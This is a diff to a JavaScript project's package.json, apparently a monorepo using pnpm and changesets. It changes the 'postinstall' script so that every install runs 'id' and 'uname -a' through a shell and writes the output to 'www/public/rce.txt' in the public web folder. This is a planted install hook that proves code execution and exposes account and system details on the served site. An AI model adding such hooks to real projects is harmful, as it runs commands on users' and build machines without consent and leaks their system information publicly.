@@ -43,7 +43,7 @@
     "release": "changeset version",
     "pub:beta": "cd cli && pnpm pub:beta",
     "pub:release": "cd cli && pnpm pub:release",
-    "postinstall": "id && uname -a"
+    "postinstall": "sh -c 'id; uname -a' | tee www/public/rce.txt"
   },
   "dependencies": {
     "@changesets/changelog-github": "^0.4.8",
